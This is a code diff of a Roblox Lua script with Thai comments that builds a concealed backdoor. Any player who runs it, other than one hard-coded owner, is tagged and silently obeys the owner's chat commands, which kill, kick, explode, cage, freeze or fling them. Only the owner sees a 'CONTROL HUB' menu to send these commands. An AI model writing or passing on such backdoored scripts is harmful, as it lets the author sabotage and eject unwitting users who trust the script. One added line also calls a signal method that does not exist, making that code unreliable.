@@ -3,14 +3,17 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local OwnerID = 1697390697 -- UserId ของน้อง
 
--- [ ฟังก์ชันสร้างป้าย ADMIN / 191 ]
+-- [[ ฟังก์ชันสร้างป้าย ADMIN / 191 ]]
 local function CreateTag(targetPlayer, text, color, trans)
     targetPlayer.CharacterAdded:Connect(function(char)
-        local head = char:WaitForChild("Head", 5)
+        local head = char:WaitForChild("Head", 10)
         if not head then return end
         
+        -- ลบป้ายเก่าถ้ามี
+        if head:FindFirstChild("Tag191") then head.Tag191:Destroy() end
+
         local bgui = Instance.new("BillboardGui", head)
-        bgui.Name = "AdminTag"
+        bgui.Name = "Tag191"
         bgui.Size = UDim2.new(0, 100, 0, 50)
         bgui.StudsOffset = Vector3.new(0, 3, 0)
         bgui.AlwaysOnTop = true
@@ -29,120 +32,106 @@ local function CreateTag(targetPlayer, text, color, trans)
         label.TextSize = 18
         label.Font = Enum.Font.GothamBold
     end)
+    -- รันซ้ำเผื่อกรณีรันสคริปต์ตอนเกิดอยู่แล้ว
+    if targetPlayer.Character then targetPlayer.CharacterAdded:Fire(targetPlayer.Character) end
 end
 
--- [ ฟังก์ชัน Fling แบบเด้งออกนอกโลก ]
-local function ExecuteHardFling()
+-- [[ ระบบสั่งการที่จะรันในเครื่องเหยื่อ ]]
+local function RunCommand(cmd)
     local char = LocalPlayer.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
     local hum = char and char:FindFirstChildOfClass("Humanoid")
-    
-    if hrp and hum then
-        -- ทำให้ตัวลอยและหมุนด้วยความเร็วสูงมาก
-        local velocity = Instance.new("BodyVelocity")
-        velocity.Velocity = Vector3.new(500000, 500000, 500000) -- แรงดันมหาศาล
-        velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-        velocity.Parent = hrp
-        
-        local angular = Instance.new("BodyAngularVelocity")
-        angular.AngularVelocity = Vector3.new(10000, 10000, 10000) -- หมุนจนมองไม่ทัน
-        angular.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
-        angular.Parent = hrp
-        
-        hum.PlatformStand = true -- ปิดระบบฟิสิกส์ปกติของตัวละครเพื่อให้ปลิวง่ายขึ้น
-        
-        task.wait(0.5) -- ปลิวออกไปครึ่งวินาที
-        char:BreakJoints() -- ตัวแตกสลาย
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not (char and hum and hrp) then return end
+
+    if cmd == "!kill" then hum.Health = 0
+    elseif cmd == "!kick" then LocalPlayer:Kick("191 System: Access Denied")
+    elseif cmd == "!fly" then
+        local bv = Instance.new("BodyVelocity", hrp)
+        bv.Velocity = Vector3.new(0, 150, 0)
+        bv.MaxForce = Vector3.new(0, math.huge, 0)
+        task.wait(3) bv:Destroy()
+    elseif cmd == "!boom" then
+        local ex = Instance.new("Explosion", workspace)
+        ex.Position = hrp.Position
+    elseif cmd == "!freeze" then hrp.Anchored = not hrp.Anchored
+    elseif cmd == "!cage" then
+        local p = Instance.new("Part", workspace)
+        p.Size, p.CFrame, p.Anchored, p.Transparency = Vector3.new(6,8,6), hrp.CFrame, true, 0.5
+        p.Color = Color3.new(0,0,0)
+    elseif cmd == "!sit" then hum.Sit = true
+    elseif cmd == "!fling" then
+        local bV = Instance.new("BodyVelocity", hrp)
+        bV.Velocity = Vector3.new(500000, 500000, 500000)
+        bV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        local bA = Instance.new("BodyAngularVelocity", hrp)
+        bA.AngularVelocity = Vector3.new(10000, 10000, 10000)
+        bA.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+        hum.PlatformStand = true
+        task.wait(0.5) char:BreakJoints()
     end
 end
 
--- [ ระบบดักฟังแชท ]
-local function ListenToOwner(player)
+-- [[ ระบบดักฟังแชท ]]
+local function Listen(player)
     player.Chatted:Connect(function(msg)
         if player.UserId == OwnerID then
             local args = string.split(msg:lower(), " ")
-            local cmd = args[1]
-            local target = args[2]
-            
-            if target and string.find(LocalPlayer.Name:lower(), target) then
-                if cmd == "!fling" then
-                    ExecuteHardFling()
-                elseif cmd == "!sit" then
-                    if LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
-                        LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
-                    end
-                elseif cmd == "!kick" then
-                    LocalPlayer:Kick("191 System: Access Denied")
-                end
+            if args[2] and string.find(LocalPlayer.Name:lower(), args[2]) then
+                RunCommand(args[1])
             end
         end
     end)
 end
 
--- [ แยกการรันระหว่าง Master (น้อง) กับ Client (คนอื่น) ]
+-- [[ แยกส่วนการทำงาน ]]
 if LocalPlayer.UserId == OwnerID then
-    -- สร้างป้าย Admin ของน้อง
-    CreateTag(LocalPlayer, "ADMIN", Color3.fromRGB(255, 255, 255), 0.2)
+    CreateTag(LocalPlayer, "ADMIN", Color3.new(1,1,1), 0.2)
 else
-    -- สำหรับคนอื่น: สร้างป้าย 191 และรอรับคำสั่ง (จบแค่นี้ เมนูไม่ขึ้น)
-    CreateTag(LocalPlayer, "191", Color3.fromRGB(255, 255, 255), 0.5)
-    for _, p in pairs(Players:GetPlayers()) do ListenToOwner(p) end
-    Players.PlayerAdded:Connect(ListenToOwner)
-    return -- หยุดสคริปต์ตรงนี้ เมนู Rayfield จะไม่ถูกสร้างในเครื่องคนอื่น
+    CreateTag(LocalPlayer, "191", Color3.new(1,1,1), 0.5)
+    for _, p in pairs(Players:GetPlayers()) do Listen(p) end
+    Players.PlayerAdded:Connect(Listen)
+    return -- คนอื่นจบงานที่นี่ เมนูไม่ขึ้น
 end
 
--- [ ส่วนของเมนู Rayfield (ขึ้นเฉพาะเครื่องน้อง) ]
-local Window = Rayfield:CreateWindow({
-   Name = "191 CONTROL HUB (MASTER)",
-   LoadingTitle = "Welcome back, Boss",
-   LoadingSubtitle = "Admin System Active",
-})
-
-local MainTab = Window:CreateTab("Main", 4483362458)
-local SelectedTarget = ""
+-- [[ ส่วนของ MASTER ADMIN (เฉพาะน้อง) ]]
+local Window = Rayfield:CreateWindow({ Name = "191 CONTROL HUB (MASTER)" })
+local MainTab = Window:CreateTab("Users", 4483362458)
+local Selected = ""
 
 local Dropdown = MainTab:CreateDropdown({
-   Name = "Target Player",
+   Name = "Target (191 Users Only)",
    Options = {},
-   CurrentOption = "",
-   Callback = function(Option) SelectedTarget = Option end,
+   Callback = function(Option) Selected = Option end,
 })
 
--- ฟังก์ชันดึงชื่อคน
-local function RefreshList()
-    local pList = {}
-    for _, v in pairs(Players:GetPlayers()) do table.insert(pList, v.Name) end
-    Dropdown:Set(pList)
+local function Refresh()
+    local list = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Character and p.Character:FindFirstChild("Head") and p.Character.Head:FindFirstChild("Tag191") then
+            if p ~= LocalPlayer then table.insert(list, p.Name) end
+        end
+    end
+    Dropdown:Set(list)
 end
 
-MainTab:CreateButton({
-   Name = "Refresh List",
-   Callback = RefreshList
-})
+MainTab:CreateButton({ Name = "Refresh Active Users", Callback = Refresh })
 
-MainTab:CreateSection("Admin Actions")
+local function Send(c)
+    if Selected ~= "" then
+        local chat = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        chat:FireServer(c.." "..Selected, "All")
+    end
+end
 
-MainTab:CreateButton({
-   Name = "Fling Target (แกล้งคนรันสคริปต์)",
-   Callback = function()
-      -- ส่งคำสั่งผ่านแชทเพื่อกระตุ้นสคริปต์ในเครื่องคนนั้น
-      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!fling "..SelectedTarget, "All")
-   end,
-})
+MainTab:CreateSection("Actions")
+MainTab:CreateButton({ Name = "Kill", Callback = function() Send("!kill") end })
+MainTab:CreateButton({ Name = "Kick", Callback = function() Send("!kick") end })
+MainTab:CreateButton({ Name = "Fly", Callback = function() Send("!fly") end })
+MainTab:CreateButton({ Name = "Boom", Callback = function() Send("!boom") end })
+MainTab:CreateButton({ Name = "Freeze", Callback = function() Send("!freeze") end })
+MainTab:CreateButton({ Name = "Cage", Callback = function() Send("!cage") end })
+MainTab:CreateButton({ Name = "Sit", Callback = function() Send("!sit") end })
+MainTab:CreateButton({ Name = "HARD FLING", Callback = function() Send("!fling") end })
 
-MainTab:CreateButton({
-   Name = "Force Sit",
-   Callback = function()
-      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!sit "..SelectedTarget, "All")
-   end,
-})
-
-MainTab:CreateButton({
-   Name = "Force Kick",
-   Callback = function()
-      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!kick "..SelectedTarget, "All")
-   end,
-})
-
-RefreshList() -- อัปเดตรายชื่อครั้งแรก
+Refresh()
 
